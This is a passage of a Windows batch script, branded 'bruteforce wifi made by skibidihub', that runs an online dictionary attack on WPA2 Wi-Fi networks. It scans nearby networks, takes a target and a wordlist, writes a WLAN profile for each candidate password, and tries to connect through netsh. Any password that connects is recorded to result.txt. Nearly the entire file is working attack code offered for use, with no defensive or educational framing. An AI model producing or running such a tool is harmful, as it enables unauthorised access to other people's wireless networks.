        call :color_echo . yellow " Only '1' Interface Found!"
        echo.
        echo.
        call :color_echo . white " !interface[0]_description!("
        call :color_echo . blue "!interface[0]_mac!"
        call :color_echo . white ")"
        echo.
        echo.
        echo Making !interface[0]_description! the default interface...
        set interface_id=!interface[0]_id!
        set interface_description=!interface[0]_description!
        set interface_mac=!interface[0]_mac!
        timeout /t 3 >nul
	)
	
	if !interface_number! gtr 1 (

        call :color_echo . yellow " Multiple '!interface_number!' Interfaces Found!"
        echo.
        timeout /t 3 >nul
        call :interface_selection
        
	)
	
	if "!interface_number!"=="0" (

        call :color_echo . yellow "WARNING"
        echo.
        echo No interfaces found on this device^^!
        echo.
        set interface_id=not_defined
        set interface_description=not_defined
        set interface_mac=not_defined
        pause
        cls
	)

goto :eof


:interface_selection
    cls
    echo.
    call :color_echo . cyan "Interface Selection"
    echo.
    echo.
    set wifi_target=not_defined
    set /a interface_number_zero_indexed=!interface_number!-1
    set /a cancel_index=!interface_number_zero_indexed!+1

    for /l %%a in ( 0, 1, !interface_number_zero_indexed! ) do (
        call :color_echo . magenta "%%a) "
        call :color_echo . white " !interface[%%a]_description!("
        call :color_echo . blue "!interface[%%a]_mac!"
        call :color_echo . white ")"
        echo.
    )
    call :color_echo
    call :color_echo . red "!cancel_index!) Cancel"
    echo.
    echo.

    call :program_prompt

    if "!program_prompt_input!" equ "" (
        call :program_prompt_invalid_input
        goto :interface_selection
    )

    if !program_prompt_input! leq !interface_number_zero_indexed! (
        if !program_prompt_input! geq 0 (
            echo.
            echo Making !interface[%program_prompt_input%]_description! the interface...
            set interface_id=!interface[%program_prompt_input%]_id!
            set interface_description=!interface[%program_prompt_input%]_description!
            set interface_mac=!interface[%program_prompt_input%]_mac!
            timeout /t 3 >nul
        ) else (
            if "!program_prompt_input!" equ "!cancel_index!" (
                set interface_id=not_defined
                set interface_description=not_defined
                set interface_mac=not_defined
                goto :eof
            ) else (
                call :program_prompt_invalid_input
                goto :interface_selection
            )
        )
    ) else (

        if "!program_prompt_input!" equ "!cancel_index!" (
            set interface_id=not_defined
            set interface_description=not_defined
            set interface_mac=not_defined
            goto :eof
        ) else (
            call :program_prompt_invalid_input
            goto :interface_selection
        )


    )


goto :eof


:program_prompt
    call :color_echo . green " bruteforcer"
    call :color_echo . white "$ "
    set /p program_prompt_input=
goto :eof


:program_prompt_invalid_input
    call :color_echo . red "Invalid input"
    timeout /t 3 >nul
goto :eof

:mainmenu
    cls
    echo.
	echo.
	echo   ██████  ██ ▄█▀ ██▓ ▄▄▄▄    ██▓▓█████▄  ██▓      ▄████▄   ▄████▄  
	echo ▒██    ▒  ██▄█▒ ▓██▒▓█████▄ ▓██▒▒██▀ ██▌▓██▒     ▒██▀ ▀█  ▒██▀ ▀█  
	echo ░ ▓██▄   ▓███▄░ ▒██▒▒██▒ ▄██▒██▒░██   █▌▒██▒     ▒▓█    ▄ ▒▓█    ▄ 
	echo   ▒   ██▒▓██ █▄ ░██░▒██░█▀  ░██░░▓█▄   ▌░██░     ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒
	echo ▒██████▒▒▒██▒ █▄░██░░▓█  ▀█▓░██░░▒████▓ ░██░ ██▓ ▒ ▓███▀ ░▒ ▓███▀ ░
	echo ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓  ░▒▓███▀▒░▓   ▒▒▓  ▒ ░▓   ▒▓▒ ░ ░▒ ▒  ░░ ░▒ ▒  ░
	echo ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░▒░▒   ░  ▒ ░ ░ ▒  ▒  ▒ ░ ░▒    ░  ▒     ░  ▒   
	echo ░  ░  ░  ░ ░░ ░  ▒ ░ ░    ░  ▒ ░ ░ ░  ░  ▒ ░ ░   ░        ░        
	echo       ░  ░  ░    ░   ░       ░     ░     ░    ░  ░ ░      ░ ░      
	echo                           ░      ░            ░  ░        ░        
	echo.
    echo.
    call :color_echo . cyan "bruteforce wifi made by skibidihub"
    echo.
    echo.
    call :color_echo . magenta "Interface : "
    call :color_echo . white "!interface_description!("
    call :color_echo . blue "!interface_mac!"
    call :color_echo . white ") "
    echo.
    call :color_echo . magenta "ID        : "
    call :color_echo . white "!interface_id!"
    echo.
    call :color_echo . magenta "Target    : "
    call :color_echo . white "!wifi_target!"
    echo.
    call :color_echo . magenta "Wordlist  : "
    call :color_echo . white "!wordlist_file!"
    echo.
    echo.
    echo Type 'help' for more info
    echo.
    call :program_prompt
    echo.

    if "%program_prompt_input%" equ "scan" (
        call :scan
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "interface" (
        call :interface_init
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "attack" (
        call :attack
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "help" (
        call :help
        goto :mainmenu
    )


    if "%program_prompt_input%" equ "wordlist" (
        call :wordlist
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "counter" (
        call :counter
        goto :mainmenu
    )

    if "%program_prompt_input%" equ "exit" (
        exit
    )

    call :program_prompt_invalid_input
goto :mainmenu


:scan
    cls

    if "%interface_id%" equ "not_defined" (
        call :color_echo . red "You have to select an interface to perform a scan"
        set wifi_target=not_defined
        echo.
        echo.
        pause
        goto :eof
    )

    netsh wlan disconnect interface="%interface_id%" > nul

    :scan_wait_disconnected_loop
    call :interface_find_state

    if "%interface_state%" neq "disconnected" (
        goto :scan_wait_disconnected_loop
    )
    

    echo.
    call :color_echo . cyan "Possible Wi-Fi Networks"
    echo.
    echo.
    echo Scanning...
    echo.
    :: wifi[] is the array for possible wifis
    set scan_wifi_index=0
    set cancel_index=0

    set scan_parse_counter=0
    set scan_parse_begin=false
    set scan_parse_line=
    set scan_parse_arg=

    for /f "skip=3 tokens=* delims=" %%a in ('netsh wlan show networks mode^=bssid interface^="%interface_id%" ^| findstr /n "^"') do (
        set "scan_parse_line=%%a"
        set "scan_parse_line=!scan_parse_line:*:=!"

        if "!scan_parse_begin!" equ "true" if "!scan_parse_line!" neq "" (
            for /f "tokens=1,* delims=:" %%x in ("!scan_parse_line!") do set scan_parse_arg=%%y

            call :trim_spaces scan_parse_arg

            if "!scan_parse_counter!" equ "0" (
                set wifi[!scan_wifi_index!]_ssid=!scan_parse_arg!
            )

            if "!scan_parse_counter!" equ "5" (
                set wifi[!scan_wifi_index!]_signal=!scan_parse_arg!
            )

            set /a scan_parse_counter=!scan_parse_counter!+1

        )

        if !scan_parse_counter! gtr 5 (
            set scan_parse_counter=0
            set /a scan_wifi_index=!scan_wifi_index!+1
            set scan_parse_begin=false
        )

        if "!scan_parse_line!" equ "" (
            set scan_parse_begin=true
        )

    )
    set /a scan_wifi_index=!scan_wifi_index!-1
    set /a cancel_index=!scan_wifi_index!+1
    
    for /l %%a in ( 0, 1, !scan_wifi_index! ) do (

        call :color_echo . magenta "%%a) "

        if "!wifi[%%a]_ssid!" equ "" (
            call :color_echo . red "No Name "
        ) else (
            call :color_echo . white "!wifi[%%a]_ssid! "
        )

        call :color_echo . blue "!wifi[%%a]_signal!"
        echo.
    )


    call :color_echo . red "!cancel_index!) Cancel"
    echo.
    echo.

    call :program_prompt
    echo.
    if "!program_prompt_input!" equ "!cancel_index!" (
        goto :eof
    )
    if !program_prompt_input! leq !scan_wifi_index! if !program_prompt_input! geq 0 (
            set "wifi_target=!wifi[%program_prompt_input%]_ssid!"
            goto :eof
    )
    call :program_prompt_invalid_input

goto :eof


:attack

    set attack_finalize=false

    if "!wordlist_file!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please provide a wordlist..."
        echo.
        echo.
        pause
        goto :eof
    )


    if "!wifi_target!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please select a target after scanning..."
        echo.
        echo.
        pause
        goto :eof
    )

    if "!interface_id!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please select an interface..."
        echo.
        echo.
        pause
        goto :eof
    )

    cls
    echo.
    call :color_echo . yellow "WARNING"
    echo.
    echo.
    echo If you connected to a network with the same name as this: "!wifi_target!",
    echo its profile will be deleted.
    echo.
    echo This app might not find the correct password if the signal strength
    echo is too low. Remember, this is an online attack. Expect slow attempts.
    echo.
    echo When an authentication is detected, attack counter is
    echo automatically increased by 5 to ensure successful connection.
    echo.
    pause
    netsh wlan delete profile name="!wifi_target!" interface="!interface_id!">nul
    cls

    set password_count=0
    
    for /f "tokens=1" %%a in ( !wordlist_file! ) do (

        set /a password_count=!password_count!+1
        set password=%%a
		set temp_auth_num=0
        :: Prepare ssid import
        del /Q /F importwifi.xml 2>nul
        call :importwifi_write
        netsh wlan add profile filename="importwifi.xml" interface="!interface_id!" >nul
        cls
        echo.
		echo   ██████  ██ ▄█▀ ██▓ ▄▄▄▄    ██▓▓█████▄  ██▓      ▄████▄   ▄████▄  
		echo ▒██    ▒  ██▄█▒ ▓██▒▓█████▄ ▓██▒▒██▀ ██▌▓██▒     ▒██▀ ▀█  ▒██▀ ▀█  
		echo ░ ▓██▄   ▓███▄░ ▒██▒▒██▒ ▄██▒██▒░██   █▌▒██▒     ▒▓█    ▄ ▒▓█    ▄ 
		echo   ▒   ██▒▓██ █▄ ░██░▒██░█▀  ░██░░▓█▄   ▌░██░     ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒
		echo ▒██████▒▒▒██▒ █▄░██░░▓█  ▀█▓░██░░▒████▓ ░██░ ██▓ ▒ ▓███▀ ░▒ ▓███▀ ░
		echo ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓  ░▒▓███▀▒░▓   ▒▒▓  ▒ ░▓   ▒▓▒ ░ ░▒ ▒  ░░ ░▒ ▒  ░
		echo ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░▒░▒   ░  ▒ ░ ░ ▒  ▒  ▒ ░ ░▒    ░  ▒     ░  ▒   
		echo ░  ░  ░  ░ ░░ ░  ▒ ░ ░    ░  ▒ ░ ░ ░  ░  ▒ ░ ░   ░        ░        
		echo       ░  ░  ░    ░   ░       ░     ░     ░    ░  ░ ░      ░ ░      
		echo                           ░      ░            ░  ░        ░        
		echo.
        call :color_echo . cyan "Attacking"
        echo.
        echo.
        call :color_echo . magenta "Target Wi-Fi   : "
        call :color_echo . white "!wifi_target!"
        echo.
        call :color_echo . magenta "Password Count : "
        call :color_echo . white "!password_count!"
        echo.
        echo.
        call :color_echo . blue "Trying password -> "
        call :color_echo . yellow "!password!"
        echo.
        echo.
        call :color_echo . cyan "Attempts: "
        echo.

        call :attack_attempt

        if "!attack_finalize!" equ "true" (
            set attack_finalize=false
            goto :eof
        )

    )

    call :attack_failure
goto :eof


:importwifi_write

    set wifi_target_xml=!wifi_target!
    set wifi_target_xml=!wifi_target_xml:^&=^&amp;!
    set wifi_target_xml=!wifi_target_xml:^<=^&lt;!
    set wifi_target_xml=!wifi_target_xml:^>=^&gt;!
    set wifi_target_xml=!wifi_target_xml:^"=^&quot;!
    set wifi_target_xml=!wifi_target_xml:^'=^&apos;!

    set password_xml=!password!
    set password_xml=!password_xml:^&=^&amp;!
    set password_xml=!password_xml:^<=^&lt;!
    set password_xml=!password_xml:^>=^&gt;!
    set password_xml=!password_xml:^"=^&quot;!
    set password_xml=!password_xml:^'=^&apos;!


    echo ^<?xml version="1.0"?^> >> importwifi.xml
    echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^> >> importwifi.xml
    echo    ^<name^>!wifi_target_xml!^</name^> >> importwifi.xml
    echo    ^<SSIDConfig^> >> importwifi.xml
    echo        ^<SSID^> >> importwifi.xml
    echo            ^<name^>!wifi_target_xml!^</name^> >> importwifi.xml
    echo        ^</SSID^> >> importwifi.xml
    echo    ^</SSIDConfig^> >> importwifi.xml
    echo    ^<connectionType^>ESS^</connectionType^> >> importwifi.xml
    echo    ^<connectionMode^>manual^</connectionMode^> >> importwifi.xml
    echo    ^<MSM^> >> importwifi.xml
    echo        ^<security^> >> importwifi.xml
    echo            ^<authEncryption^> >> importwifi.xml
    echo                ^<authentication^>WPA2PSK^</authentication^> >> importwifi.xml
    echo                ^<encryption^>AES^</encryption^> >> importwifi.xml
    echo                ^<useOneX^>false^</useOneX^> >> importwifi.xml
    echo            ^</authEncryption^> >> importwifi.xml
    echo            ^<sharedKey^> >> importwifi.xml
    echo                ^<keyType^>passPhrase^</keyType^> >> importwifi.xml
    echo                ^<protected^>false^</protected^> >> importwifi.xml
    echo                ^<keyMaterial^>!password_xml!^</keyMaterial^> >> importwifi.xml
    echo            ^</sharedKey^> >> importwifi.xml
    echo        ^</security^> >> importwifi.xml
    echo    ^</MSM^> >> importwifi.xml
    echo    ^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^> >> importwifi.xml
    echo        ^<enableRandomization^>false^</enableRandomization^> >> importwifi.xml
    echo    ^</MacRandomization^> >> importwifi.xml
    echo ^</WLANProfile^> >> importwifi.xml

goto :eof

:attack_failure
    del /Q /F importwifi.xml 2>nul
    cls
    echo.
    call :color_echo . red "Could not find the password"
    echo.
    echo.
    netsh wlan delete profile "!wifi_target!" interface="!interface_id!">nul
    pause
goto :eof

:attack_success
    del /Q /F importwifi.xml 2>nul
    cls
    echo.
    call :color_echo . green "Found the password"
    echo.
    echo.
    echo.
    call :color_echo . magenta "Target     : "
    call :color_echo . white "!wifi_target!"
    echo.
    call :color_echo . magenta "Password   : "
    call :color_echo . white "!password!"
    echo.
    call :color_echo . magenta "At attempt : "
    call :color_echo . white "!password_count!"
    echo.
    echo.

    echo Batch Wi-Fi Brute Forcer Result>>result.txt
    echo Target     : !wifi_target!>>result.txt
    echo At attempt : !password_count!>>result.txt
    echo Password   : !password!>>result.txt
    echo.>>result.txt
    pause
goto :eof

:attack_attempt
	netsh wlan connect name="%wifi_target%" interface="%interface_id%" >nul

    if "%attack_counter_option%" equ "0" (
        set attack_counter=5
    ) else (
        set attack_counter=!attack_counter_option!
    )

    set attack_authenticating_detected=false

    :attack_attempt_loop

        if "!attack_counter!" equ "0" (
            del /Q /F importwifi.xml 2>nul
            goto :eof
        )

        call :color_echo . white "Attempts Left ("
        call :color_echo . magenta "!attack_counter!"
        call :color_echo . white ") "

        timeout /t 1 /nobreak >nul
        set interface_state=none
        call :interface_find_state

        if "%interface_state%"=="disconnecting" (
            call :color_echo . red "Timeout"
            echo.
        )
        if "%interface_state%"=="disconnected" (
            call :color_echo . red "Timeout"
            echo.
        )
        if "%interface_state%"=="authenticating" (
            call :color_echo . blue "Authenticating"
            echo.
        )
        if "%interface_state%"=="connecting" (
            call :color_echo . yellow "Connecting"
            echo.
        )
        if "%interface_state%"=="connected" (
            call :color_echo . green "Connected"
            echo.
            timeout /t 2 /nobreak>nul
        )

        if "%interface_state%" equ "authenticating" (
            if "!attack_authenticating_detected!" equ "false" (
                set /a attack_counter=!attack_counter!+5
                set attack_authenticating_detected=true
            )
        ) 

        if "!interface_state!" equ "connecting" (
            del /Q /F importwifi.xml 2>nul
            set attack_finalize=true
            call :attack_success
            goto :eof
        )

        if "!interface_state!" equ "connected" (
            del /Q /F importwifi.xml 2>nul
            set attack_finalize=true
            call :attack_success
            goto :eof
        )
        

        if "!interface_state!" equ "none" (
            call :exit_fatal "Cannot find interface state!"
        )

        set /a attack_counter=!attack_counter!-1

    goto :attack_attempt_loop

goto :eof

:help
	cls
	echo.
	call :color_echo . cyan "Commands"
	echo.
	echo.
	echo  - help             : Displays this page
	echo  - wordlist         : Provide a wordlist file
	echo  - scan             : Performs a WI-FI scan
	echo  - interface        : Open Interface Management
	echo  - attack           : Attacks selected WI-FI
	echo  - counter          : Sets the attack counter
	echo  - exit             : Close the program
	echo.
	echo.
	echo.
	echo Press any key to continue...
	pause >nul

goto :eof


:wordlist
    cls
    echo.
    call :color_echo . cyan "Wordlist"
    echo.
    echo.
    echo Please provide a valid wordlist
    echo.
    call :program_prompt
    echo.
    if not exist "!program_prompt_input!" (
        call :color_echo . red "Provided path does not resolve to a file"
        timeout /t 2 >nul
    ) else (
        set wordlist_file=!program_prompt_input!
        goto :eof
    )
goto :eof

:counter
    cls
    echo.
    call :color_echo . cyan "Set Attempt Count"
    echo.
    echo.
    echo Please provide number for per-password 
    echo counter while attacking a network.
    echo.
    echo This counter will be used to query network
    echo connection whether it is successful.
    echo.
    call :program_prompt
    echo.
    echo %program_prompt_input%| findstr /r "^[0-9]*$" >nul
    
    if "%errorlevel%" equ "0" (
        set attack_counter_option=!program_prompt_input!
    ) else (
        call :color_echo . red "Provided input is not a valid number"
        timeout /t 2 >nul
    )
goto :eof

:interface_find_state

    for /f "tokens=2 delims==" %%A in ('wmic path WIN32_NetworkAdapter where "NetConnectionID='!interface_id!'" get NetConnectionStatus /value') do (
        set interface_status_code=%%A
    )

    if "%interface_status_code%"=="1" (
        set interface_state=connecting
    )

    if "%interface_status_code%"=="2" (
        set interface_state=connected
    )
    
    if "%interface_status_code%"=="3" (
        set interface_state=disconnecting
    )

    if "%interface_status_code%"=="7" (
        set interface_state=disconnected
    )

    if "%interface_status_code%"=="8" (
        set interface_state=authenticating
    )

goto :eof


:exit_fatal
    call :color_echo . red "%~1"
    timeout /t 3 >nul
    exit
goto :eof


:trim_right
        set "str=!%~1!"
        :trim_right_loop
        if "!str:~-1!"==" " (
        set "str=!str:~0,-1!"
        goto trim_right_loop
        )
        set %~1=!str!
goto :eof


:trim_left
    set "str=!%~1!"
    :trim_left_loop
    if "!str:~0,1!"==" " (
        set "str=!str:~1!"
        goto trim_left_loop
    )
    set %~1=!str!
goto :eof


:trim_spaces
        call :trim_left %1
        call :trim_right %1
goto :eof

:discord
start 
:exit
endlocal
exit